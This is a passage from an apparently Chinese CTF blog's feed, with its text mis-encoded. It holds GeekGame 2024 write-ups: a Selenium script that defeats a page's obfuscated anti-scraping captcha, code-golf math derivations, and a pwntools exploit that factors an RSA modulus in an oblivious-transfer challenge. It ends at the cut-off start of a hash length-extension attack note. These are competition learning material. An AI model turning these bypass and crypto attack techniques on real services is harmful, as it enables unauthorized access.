class="hljs-number">0x137f</span>,a0_0x523a18.<span class="hljs-property">_0x4b8b9f</span>)](a0_0x204ab6,_0xab6759,_0x17cb53);<br><br>  <span class="hljs-comment">// è¿™é‡Œåˆ›å»ºä¸€ä¸ªæ–°çš„èŠ‚ç‚¹ï¼Œå†…å®¹æ˜¯å½±å­æ ¹çš„å†…å®¹ï¼Œç„¶åæŒ‚è½½åˆ°é¡µé¢ä¸Šï¼Œselenium å°±èƒ½è¯»åˆ°äº†</span><br>  <span class="hljs-keyword">const</span> d = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;div&quot;</span>);<br>  d.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;webcopylvl2&quot;</span>);<br>  d.<span class="hljs-property">innerHTML</span> = _0xab6759.<span class="hljs-property">innerHTML</span>;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;body&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">appendChild</span>(d);<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-params">_0x5411b3, _0x388f1b</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x32746c</span>(_0x388f1b, _0x5411b3 - -a0_0x2cad5e.<span class="hljs-property">_0x313ddb</span>);<br>  &#125;<br>  _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0xbbd</span>, <span class="hljs-number">0x303</span>)](<span class="hljs-built_in">setInterval</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">a0_0x504e28</span>(_0xab6759), <span class="hljs-number">0x1</span> * -<span class="hljs-number">0x5e1</span> + -<span class="hljs-number">0x242b</span> + <span class="hljs-number">0x494c</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç”¨ Selenium è¯»å–ä¸€ä¸‹å†…å®¹ï¼Œå‘ç°æ˜¯ç”¨ <code>data-xxxxxxxx</code> å’ŒCSS çš„ <code>content</code> æ¥æ˜¾ç¤ºçš„ã€‚æœ¬æ¥æƒ³è§£æ DOM æ ‘å’Œ CSSæ‰‹åŠ¨æ‹¼æ¥çš„ï¼Œä½†æ˜¯å‘ç° <code>&lt;style&gt;</code> èŠ‚ç‚¹å†…å®¹æ‹¿ä¸åˆ°ï¼Œè¿˜æ˜¯ç”¨<code>getComputedStyle()</code> æ¥è§£å†³è®¡ç®—åçš„å€¼ç½¢ã€‚</p><h3 id="ç»¼ä¸Š">ç»¼ä¸Š</h3><p>æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol type="1"><li>ä¿®æ”¹ js æ–‡ä»¶ï¼ˆå¯ä»¥åœ¨è¿™é‡Œ<a href="/2024/10/20/ctf/geekgame2024/page2.max.js" title="ä¸‹è½½">ä¸‹è½½</a>ä¿®æ”¹åçš„ï¼‰ï¼Œå¹¶æ”¾åœ¨<code>./static/js</code> ç›®å½•ä¸‹</li><li>åœ¨å½“å‰ç›®å½•ä¸‹å¯åŠ¨ä¸€ä¸ª http æœåŠ¡å™¨ï¼Œä¾‹å¦‚<code>python -m http.server</code></li><li>æ‰§è¡Œ Python è„šæœ¬ï¼Œæ›´åŠ å…·ä½“åœ°ï¼š<ol type="1"><li>è·å–å¸¦æœ‰å¯†æ–‡çš„ <code>index.html</code> ï¼Œå¹¶å­˜å‚¨åœ¨å½“å‰ç›®å½•ä¸‹</li><li>æ“ä½œ Selenium è¯»å–é¡µé¢</li><li>å®šä½åˆ°å…ƒç´ ï¼Œå¹¶æ‰§è¡Œ<code>getComputedStyle().getPropertyValue('content')</code>ç›´æ¥è·å¾—è§£ç åçš„ç»“æœ</li><li>æ‹¼æ¥ç»“æœå¹¶è·å¾— flag</li></ol></li></ol><p>Python è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><br><br>token       = <span class="hljs-string">&quot;&lt;your_token&gt;&quot;</span><br>home_url    = <span class="hljs-string">f&quot;https://prob05.geekgame.pku.edu.cn/?token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span><br>q2_url      = <span class="hljs-string">&quot;https://prob05.geekgame.pku.edu.cn/page2&quot;</span><br>localhost   = <span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span><br><br>s = requests.Session()<br>s.get(home_url)<br><br>res = s.get(q2_url)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> home:<br>    home.write(res.text)<br><br>data = &#123;<span class="hljs-string">&quot;response&quot;</span>: <span class="hljs-string">&quot;&quot;</span>&#125;<br>_<span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;&lt;input type=&quot;hidden&quot; name=&quot;ts&quot; value=&quot;(\d+)&quot;&gt;&#x27;</span>, res.text)<br>data[<span class="hljs-string">&quot;ts&quot;</span>] = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> _<span class="hljs-keyword">match</span>:<br>    data[<span class="hljs-string">&quot;ts&quot;</span>] = <span class="hljs-built_in">int</span>(_<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br>_<span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;&lt;input type=&quot;hidden&quot; name=&quot;certificate&quot; value=&quot;([0-9a-f]+)&quot;&gt;&#x27;</span>, res.text)<br>data[<span class="hljs-string">&quot;certificate&quot;</span>] = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> _<span class="hljs-keyword">match</span>:<br>    data[<span class="hljs-string">&quot;certificate&quot;</span>] = _<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br><br>browser = webdriver.Edge()<br>browser.get(localhost)<br>time.sleep(<span class="hljs-number">2</span>)<br><br>els = browser.find_elements(By.XPATH, <span class="hljs-string">&quot;//div[@id=&#x27;centralNoiseContainer&#x27;]/div[@id=&#x27;centralNoiseContent1&#x27;]/span&quot;</span>)<br>ans = []<br><span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> els:<br>    el_id = el.get_attribute(<span class="hljs-string">&quot;id&quot;</span>)<br>    ans.append(browser.execute_script(<span class="hljs-string">f&quot;return window.getComputedStyle(document.querySelector(&#x27;#<span class="hljs-subst">&#123;el_id&#125;</span>&#x27;), &#x27;:before&#x27;).getPropertyValue(&#x27;content&#x27;)&quot;</span>))<br>    ans.append(browser.execute_script(<span class="hljs-string">f&quot;return window.getComputedStyle(document.querySelector(&#x27;#<span class="hljs-subst">&#123;el_id&#125;</span>&#x27;), &#x27;:after&#x27;).getPropertyValue(&#x27;content&#x27;)&quot;</span>))<br>captcha = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> s: s.replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), ans))<br>data[<span class="hljs-string">&quot;response&quot;</span>] = captcha<br><br>res = s.post(q2_url, data=data)<br><span class="hljs-built_in">print</span>(res.text)<br><br>s.close()<br>time.sleep(<span class="hljs-number">5</span>)<br>browser.close()<br></code></pre></td></tr></table></figure><blockquote><p>PSï¼šæœ‰ç¾¤å‹è¯´ <code>Ctrl + s</code> å°±è¡Œäº†ï¼Œå¥½åƒâ€¦â€¦çœŸçš„æ˜¯è¿™æ ·çš„ã€‚</p><p>PPSï¼šæœ‰ç¾¤å‹è¯´ Firefoxå¯ä»¥æ— è§†åè°ƒè¯•ä»£ç å¼€æ§åˆ¶å°ï¼Œå¦‚æœæ˜¯çœŸçš„è¯â€¦â€¦å”‰ï¼Œå½“åˆæŠ›å¼ƒä½ æ˜¯æˆ‘çš„ä¸å¯¹ã€‚</p></blockquote><h2 id="algo-codegolf-ç´ æ•°åˆ¤æ–­å‡½æ•°">algo-codegolf (ç´ æ•°åˆ¤æ–­å‡½æ•°)</h2><p>å› ä¸ºåªè¦æ£€æµ‹500ä»¥å†…çš„ç´ æ•°ï¼Œé‚£ä¹ˆä¸€æ¬¡<ahref="https://oi-wiki.org/math/number-theory/prime/#fermat-%E7%B4%A0%E6%80%A7%E6%B5%8B%E8%AF%95">è´¹é©¬ç´ æ€§æµ‹è¯•</a>å³å¯ï¼ˆå›é¡¾äº†ä¸€éåŸç†å‘ç°æˆ‘å†™çš„ä¸æ˜¯è´¹é©¬ç´ æ€§æ£€éªŒï¼Œä½†æ˜¯è´¹é©¬å°å®šç†æ˜¯ç”¨ä¸Šäº†ï¼‰ã€‚è¿™é‡Œéœ€è¦çˆ†ç ´æ£€æµ‹ç”¨çš„<span class="math inline">\(a\)</span>ï¼Œä½¿å¾—å½“ä¸”ä»…å½“ <spanclass="math inline">\(n\)</span> ä¸ºç´ æ•°æ—¶ï¼Œ<spanclass="math inline">\(a^{n-1}\equiv 1(\mathrm{mod}\ n)\)</span>æˆç«‹ã€‚å†™ä¸ªä»£ç æ¥çˆ†ç ´ <span class="math inline">\(a\)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> sieve_base<br><br>primes = []<br><span class="hljs-keyword">for</span> prime <span class="hljs-keyword">in</span> sieve_base:<br>    <span class="hljs-keyword">if</span> prime &gt; <span class="hljs-number">500</span>:<br>        <span class="hljs-keyword">break</span><br>    primes.append(prime)<br><br>a = <span class="hljs-number">2</span><br>flag = <span class="hljs-literal">False</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> flag:<br>    flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">500</span>):<br>        i = <span class="hljs-built_in">pow</span>(a, p-<span class="hljs-number">1</span>, p)<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> primes:<br>            flag = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> i != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p <span class="hljs-keyword">in</span> primes:<br>            flag = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-built_in">print</span>(a)<br>        <span class="hljs-keyword">break</span><br>    a += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ° <span class="math inline">\(a =10103\)</span>ï¼Œç„¶åå°±æ˜¯è´¹é©¬ç´ æ€§æ£€éªŒï¼Œ<spanclass="math inline">\(10103^{n-1}\equiv 1(\mathrm{mod}\n)\)</span>ï¼Œå¯¹äºç´ æ•° <span class="math inline">\(n\)</span>æˆç«‹ï¼Œå¯¹äºéç´ æ•° <span class="math inline">\(n\)</span>ï¼Œå› ä¸º 10103æ˜¯ç´ æ•°ï¼Œæ‰€ä»¥æ¨¡å°äº500çš„ <spanclass="math inline">\(n\)</span>ï¼Œå€¼ä¸€å®šä¸æ˜¯0ã€‚é‚£ä¹ˆå¦‚ä½•å°†1å’Œå¤§äº1çš„å€¼æ˜ å°„åˆ°1å’Œ0å‘¢ï¼Ÿç”¨1æ•´é™¤å°±å¥½äº†ã€‚æ‰€ä»¥æœ€ç»ˆå‡½æ•°ä¸ºï¼š<code>1//(10103**(n-1)%n)</code></p><h2 id="algo-codegolf-pell">algo-codegolf (Pell)</h2><p>è¿™ä¸ªæƒ³äº†å¥½ä¹…ï¼Œçœ‹äº†æç¤ºæ‰å‡ºæ¥çš„ã€‚<ahref="https://blog.paulhankin.net/fibonacci/">æç¤º</a>çš„åšå®¢å†™å¾—éå¸¸å¥½ï¼Œæœ‰æœºä¼šçš„è¯æ¶è¡¥ä¸€ä¸‹ç”Ÿæˆå‡½æ•°ã€‚ç›´æ¥å¼€å§‹å…¬å¼æ¨å¯¼å§ã€‚</p><p>å¯¹äº Pell æ•°åˆ—ï¼Œå…¶é€’æ¨å…¬å¼ä¸ºï¼š</p><p><span class="math display">\[P_{n}=\left\{ \begin{align}    &amp;0 &amp;,n=1 \\    &amp;1 &amp;,n=2 \\  &amp;2P_{n-1}+P_{n-2}&amp;,n&gt;2\end{align}\right.\]</span></p><p>å¯¹äºç¬¬ <span class="math inline">\(i\)</span> é¡¹ç­‰å¼ï¼Œä¸¤è¾¹åŒä¹˜ä»¥<span class="math inline">\(x^{i+1}\)</span>ï¼Œå³<spanclass="math inline">\(P_{i+2}x^{i+1} = 2P_{i+1}x^{i+1} +P_{i}x^{i+1}\)</span>ï¼Œç„¶åç´¯åŠ å‰ <span class="math inline">\(n\)</span>é¡¹ç­‰å¼ï¼Œå¾—åˆ°</p><p><span class="math display">\[\sum_{i=1}^nP_{i+2}x^{i+1} =2\sum_{i=1}^nP_{i+1}x^{i+1} + \sum_{i=1}^nP_{i}x^{i+1}\]</span></p><p>ä»¤ <spanclass="math inline">\(\mathcal{P}_n(x)=\sum_{i=1}^nP_{i}x^{i-1}\)</span>ï¼Œåˆ™ä¸Šè¿°ç­‰å¼å¯ä»¥å†™ä¸ºï¼š</p><p><span class="math display">\[\begin{align}\mathcal{P}_{n+2}(x)-P_2x-P_1 &amp;= 2x(\mathcal{P}_{n+1}(x)-P_1) +x^2\mathcal{P}_{n}(x) \\\mathcal{P}_{n+2}(x)-x &amp;= 2x\mathcal{P}_{n+1}(x) +x^2\mathcal{P}_{n}(x)\end{align}\]</span></p><p>ä¹Ÿè®¸è¿™é‡Œå°±æ˜¯ç”Ÿæˆå‡½æ•°çš„ç‰¹æ®Šä¹‹å¤„ï¼Œè®¤ä¸ºè¿™é‡Œçš„æ±‚å’Œæ˜¯æ”¶æ•›çš„ï¼Œå³ <spanclass="math inline">\(\lim_{n\to\infty}\mathcal{P}_{n}(x) =\mathcal{P}(x)\)</span>ã€‚<del>å¥½å§ï¼Œæ„Ÿè§‰æœ‰ç‚¹é“ç†ï¼Œå…ˆè¿™ä¹ˆè®¤ä¸ºäº†ã€‚</del></p><blockquote><p>å› ä¸º <span class="math inline">\(P_i &lt;4^i\)</span>ï¼Œæ‰€ä»¥è¯¥å‡½æ•°ä¸€å®šå°äºä¸€ä¸ªç­‰æ¯”æ•°åˆ—æ±‚å’Œï¼Œé‚£ä¹ˆåªè¦è®© <spanclass="math inline">\(x &lt;\frac{1}{4}\)</span>ï¼Œå³åœ¨æ”¶æ•›åŠå¾„ä¸­ï¼Œè¿™ä¸ªå¹‚çº§æ•°å°±ä¸€å®šæ”¶æ•›</p></blockquote><p>é‚£ä¹ˆé€šè¿‡ä¸Šè¿°ç­‰å¼ï¼Œå¾—åˆ°ï¼š</p><p><spanclass="math display">\[\mathcal{P}(x)=\frac{x}{1-2x-x^2}\]</span></p><p>ç”¨PythonéªŒè¯ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>P = <span class="hljs-keyword">lambda</span> x: x/(<span class="hljs-number">1</span>-<span class="hljs-number">2</span>*x-x**<span class="hljs-number">2</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>P(<span class="hljs-number">1e-3</span>)<br><span class="hljs-number">0.0010020050120290703</span><br></code></pre></td></tr></table></figure><p>ä¸éš¾å‘ç°ï¼Œè¿™é‡Œå°æ•°éƒ¨åˆ†å±•ç¤ºäº† Pell æ•°çš„ 2 è‡³ 7 é¡¹ï¼ŒåŸå› æ˜¯ï¼š</p><p><spanclass="math display">\[\mathcal{P}(10^{-3})=\sum_{i=1}^{\infty}10^{-3(i-1)}P_i\]</span></p><p>é‚£ä¹ˆï¼Œ<span class="math inline">\(P_i\equiv \lfloor10^{3(i-1)}\mathcal{P}(10^{-3})\rfloor (\mathrm{mod}\10^3)\)</span>ï¼Œæ³¨æ„åˆ°è¿™é‡Œæ¨¡æ•°è¦æ¯” <spanclass="math inline">\(P_i\)</span> å¤§ï¼Œä¸ç„¶å°±åªèƒ½å¾—åˆ°æ¨¡æ•°äº†ã€‚è€Œ Pellæ•°çš„é€šé¡¹å…¬å¼ä¸ºï¼š</p><p><spanclass="math display">\[P_n=\frac{(1+\sqrt{2})^n-(1-\sqrt{2})^n}{2\sqrt{2}}\]</span></p><p>æ‰€ä»¥ï¼Œ<span class="math inline">\(P_n &lt; 4^{n+1}\)</span>ã€‚ä»¤ <spanclass="math inline">\(x = 4^{-i-1}\)</span>ï¼Œåˆ™</p><p><span class="math display">\[\begin{align}P_i &amp;\equiv \lfloor 4^i\mathcal{P}(4^{-i-1})\rfloor (\mathrm{mod}\4^{i+1}) \\P_i &amp;= \lfloor \frac{4^i*4^{-i-1}}{1-2*4^{-i-1}-4^{-2i-2}} \rfloor(\mathrm{mod}\ 4^{i+1}) \\&amp;= \lfloor \frac{4^i*4^{i+1}}{4^{2i+2} - 2*4^{i+1} - 1} \rfloor(\mathrm{mod}\ 4^{i+1}) \\&amp;= \lfloor \frac{4^{i^2+i}}{16*16^i - 8*4^i - 1} \rfloor(\mathrm{mod}\ 4*4^i)\end{align}\]</span></p><p>å†™æˆ Pythonä»£ç ä¸ºï¼š<code>4**(n*n+n)//(16*16**n-8*4**n-1)%(4*4**n)</code></p><h2 id="ä¸ç»æ„ä¼ è¾“ç®€å•å¼€ä¸ªé”">ä¸ç»æ„ä¼ è¾“(ğŸ—ç®€å•å¼€ä¸ªé”ï¸)</h2><p>æƒ³åˆ°äº†ä¸€ç‚¹ï¼Œä½†å°±æ˜¯ä¸€ç‚¹ï¼Œåé¢ç»“åˆæç¤ºçªå…¬å¼çš„æ—¶å€™æ‰¾åˆ°äº†å…³é”®ç‚¹ã€‚</p><h3 id="é¢˜é¢">é¢˜é¢</h3><p><code>FROM RSA:classic</code></p><p>å·²çŸ¥ <span class="math inline">\(p, q, n=pq, e=65537, d\equive^{-1}(\mathrm{mod}\ \varphi(n)), x_0, x_1\)</span>ï¼Œå…¶ä¸­ <spanclass="math inline">\(p\)</span> å’Œ <spanclass="math inline">\(q\)</span> ä¸ºç´ æ•°ï¼Œ<spanclass="math inline">\(\varphi(n)\)</span> ä¸ºæ¬§æ‹‰å‡½æ•°ï¼Œ<spanclass="math inline">\(x_0\)</span> å’Œ <spanclass="math inline">\(x_1\)</span> ä¸ºå°äº <spanclass="math inline">\(n\)</span> çš„éšæœºæ•°ã€‚å¯¹äºç»™å®š <spanclass="math inline">\(v\)</span>ï¼Œå·²çŸ¥</p><p><span class="math display">\[\left\{\begin{align}v_0 \equiv ((v-x_0)^d+(p+q)^d+f)(\mathrm{mod}\ n) \\v_1 \equiv ((v-x_1)^d+(p-q)^d+f)(\mathrm{mod}\ n)\end{align}\right.\]</span></p><p>æ±‚è§£ <span class="math inline">\(f\)</span>çš„å€¼ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œåªèƒ½è·å–ä¸€æ¬¡ <span class="math inline">\(v_0\)</span> å’Œ<span class="math inline">\(v_1\)</span>ï¼‰</p><p>ä»¤ <span class="math inline">\(v = x_1\)</span>ï¼Œå› ä¸º <spanclass="math inline">\(d\)</span> ä¸ºå¥‡æ•°ï¼Œè€Œ <spanclass="math inline">\((p\pm q)^d\)</span> çš„ä¸­é—´é¡¹è‡³å°‘åŒ…å«ä¸€ä¸ª <spanclass="math inline">\(pq=n\)</span>ï¼Œæ‰€ä»¥è¢«æ¨¡é™¤äº†ï¼Œåªå‰©ä¸‹ <spanclass="math inline">\(p^d\pm q^d\)</span></p><p><span class="math display">\[v_0-v_1 \equiv ((x_1-x_0)^d + 2q^d)(\mathrm{mod}\ n)\]</span></p><p>ç¬¬ä¸€é˜¶æ®µå°±å¡åœ¨è¿™é‡Œäº†ï¼Œç¬¬äºŒé˜¶æ®µæ ¹æ®æç¤ºæ‰æ‰¾åˆ°åé¢çš„åšæ³•</p><p><span class="math display">\[\begin{align}(v_0-v_1)^e &amp;\equiv ((x_1-x_0)^d + 2q^d)^e(\mathrm{mod}\ n) \\&amp;\equiv ((x_1-x_0) + Kq)(\mathrm{mod}\ n) (K\in \mathbb{Z})\end{align}\]</span></p><p>é‚£ä¹ˆ <spanclass="math inline">\(((v_0-v_1)^e-(x_1-x_0))(\mathrm{mod}\ n)\)</span>èƒ½è¢« <span class="math inline">\(q\)</span> æ•´é™¤ï¼Œè¿™æ ·åªéœ€è¦æ±‚ <spanclass="math inline">\(gcd(((v_0-v_1)^e-(x_1-x_0))(\mathrm{mod}\ n),n)\)</span>ï¼Œå°±èƒ½æ±‚å‡º <span class="math inline">\(q\)</span>äº†ã€‚ç„¶ååé¢å°±æ±‚å‡º <span class="math inline">\(p,d\)</span>ï¼Œæ±‚å‡º <spanclass="math inline">\(f\)</span> äº†ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>token = <span class="hljs-string">&quot;&lt;your_token&gt;&quot;</span><br><br>p = remote(<span class="hljs-string">&quot;prob07.geekgame.pku.edu.cn&quot;</span>, <span class="hljs-number">10007</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;token: &quot;</span>)<br>p.sendline(token.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;level[1/2]: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>n   = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;n = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>e   = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;e = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>x0  = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;x0 = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>x1  = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;x1 = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>p.recvuntil(<span class="hljs-string">b&quot;v = &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(x1).encode())<br>p.recvline()<br>v0  = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;v0 = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>v1  = <span class="hljs-built_in">int</span>(p.recvline().decode().strip().replace(<span class="hljs-string">&quot;v1 = &quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>p.close()<br><br>q   = gcd((<span class="hljs-built_in">pow</span>(v0-v1, e, n) - (x1-x0))%n, n)<br><span class="hljs-keyword">assert</span> q != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n%q == <span class="hljs-number">0</span><br>p   = n//q<br>d   = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>f   = (v1 - <span class="hljs-built_in">pow</span>(p, d, n) + <span class="hljs-built_in">pow</span>(q, d, n))%n<br><span class="hljs-built_in">print</span>(long_to_bytes(f))<br></code></pre></td></tr></table></figure><hr /><p>é€Ÿé€Ÿå»å†™è®ºæ–‡ï¼ï¼ï¼ğŸ˜µ</p>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
      <category>ç«èµ›</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>é•¿åº¦æ‰©å±•æ”»å‡»</title>
    <link href="/2024/08/30/ctf/notes/length-extension-attack/"/>
    <url>/2024/08/30/ctf/notes/length-extension-attack/</url>
    
    <content type="html"><![CDATA[<p>Hashé•¿åº¦æ‰©å±•æ”»å‡»ï¼šå·²çŸ¥æ˜æ–‡é•¿åº¦å’Œæ˜æ–‡çš„æ‚å‡‘å€¼ï¼Œä½†æ˜æ–‡æœ¬èº«æœªçŸ¥ï¼Œé€šè¿‡æ„é€ æ‰©å±•æ¶ˆæ¯ï¼Œå¯ä»¥è®¡ç®—å‡ºæ˜æ–‡è¿æ¥æ‰©å±•æ¶ˆæ¯çš„æ‚å‡‘å€¼ã€‚</p><span id="more"></span><h2 id="å¼•è¨€">å¼•è¨€</h2><p>åœ¨ BaseCTF ç¬¬äºŒå‘¨é‡åˆ°çš„ä¸€é“é¢˜ç›®ï¼Œé¢˜ç›®éƒ¨åˆ†å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span 